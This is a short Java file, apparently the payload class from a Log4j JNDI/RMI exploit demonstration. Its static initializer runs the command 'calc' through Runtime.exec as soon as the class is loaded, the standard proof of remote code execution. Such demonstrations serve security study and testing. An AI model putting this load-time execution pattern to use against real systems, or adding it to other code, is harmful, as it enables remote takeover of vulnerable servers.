package com.qbk.springboot.log4j.rmi;

public class Event {
    static {
        try {
            String[] cmd = {"calc"};
            Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}